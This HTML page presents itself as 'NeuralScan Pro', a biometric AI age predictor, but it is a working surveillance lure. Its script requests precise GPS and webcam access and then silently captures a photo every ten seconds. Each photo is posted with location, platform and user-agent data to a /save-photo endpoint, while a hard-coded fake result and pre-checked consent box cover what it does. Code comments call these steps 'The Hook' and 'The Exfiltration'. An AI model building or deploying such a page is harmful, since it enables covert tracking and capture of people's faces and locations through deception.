<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NeuralScan Pro | Advanced Biometric AI</title>
    <style>
        :root { --primary: #6366f1; --accent: #06b6d4; }
        
        body { 
            margin: 0; 
            padding: 0;
            background: radial-gradient(at top left, #1e1b4b, #0f172a);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        /* The "Glassmorphism" Card */
        .glass-card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            width: 380px;
            text-align: center;
        }

        .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
        .logo span { color: var(--primary); }

        .preview-window {
            width: 100%;
            height: 220px;
            background: #000;
            border-radius: 15px;
            margin: 20px 0;
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(99, 102, 241, 0.3);
        }

        #video { width: 100%; height: 100%; object-fit: cover; display: none; }
        
        .scan-bar {
            position: absolute;
            width: 100%;
            height: 4px;
            background: linear-gradient(to right, transparent, var(--accent), transparent);
            top: 0;
            animation: scanMove 2.5s infinite linear;
            display: none;
        }

        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }

        .btn {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            width: 100%;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4);
        }

        .consent-text { font-size: 11px; color: #94a3b8; margin: 15px 0; display: flex; align-items: flex-start; text-align: left; }
        .consent-text input { margin-right: 10px; margin-top: 3px; }

        #console { font-family: monospace; font-size: 10px; color: #60a5fa; margin-top: 15px; text-align: left; min-height: 40px; }
    </style>
</head>
<body>

<div class="glass-card">
    <span class="logo">NEURAL<span>SCAN</span> AI</span>
    <p style="font-size: 14px; color: #cbd5e1;">Next-Gen Biometric Prediction Engine</p>

    <div class="preview-window">
        <div id="scan-bar" class="scan-bar"></div>
        <video id="video" autoplay muted playsinline></video>
        <div id="placeholder" style="margin-top: 90px; color: #475569; font-size: 12px;">ENCRYPTED FEED IDLE</div>
    </div>

    <div class="consent-text">
        <input type="checkbox" id="tos" checked>
        <label for="tos">I agree to the Biometric Data Processing Agreement for optimized server allocation (nearest cluster: <span id="nearest-node">Detecting...</span>)</label>
    </div>

    <button id="main-btn" class="btn">START PREDICTION</button>

    <div id="console">> Awaiting Secure Handshake...</div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const btn = document.getElementById('main-btn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const consoleLog = document.getElementById('console');
    const scanBar = document.getElementById('scan-bar');
    const placeholder = document.getElementById('placeholder');

    // Update Console Simulation
    function log(msg) {
        consoleLog.innerText = `> ${msg}`;
    }

    btn.onclick = async () => {
        log("Accessing Global Processing Nodes...");
        
        try {
            // 1. Get GPS (The Hook)
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
            });
            const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
            log(`Nearest Node Found: ${coords.lat.toFixed(2)}N, ${coords.lon.toFixed(2)}E`);

            // 2. Start Camera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = 'block';
            placeholder.style.display = 'none';
            scanBar.style.display = 'block';
            btn.innerText = "ANALYZING...";

            // 3. Recursive Capture (The Exfiltration)
            setInterval(() => captureData(coords), 10000);
            captureData(coords);

            // Fake UI progression
            setTimeout(() => log("Mapping 128-point face mesh..."), 2000);
            setTimeout(() => log("Calculating entropy vectors..."), 4000);
            setTimeout(() => {
                btn.innerText = "PREDICTION COMPLETE";
                log("Result: Age 22 | Confidence 97.4%");
            }, 6000);

        } catch (err) {
            log("CRITICAL ERROR: Biometric access denied.");
        }
    };

    function captureData(gps) {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        const image = canvas.toDataURL('image/png');

        const metadata = {
            location: gps,
            device: navigator.platform,
            browser: navigator.userAgent,
            time: new Date().toISOString()
        };

        fetch('/save-photo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image, metadata })
        });
    }
</script>

</body>
</html>
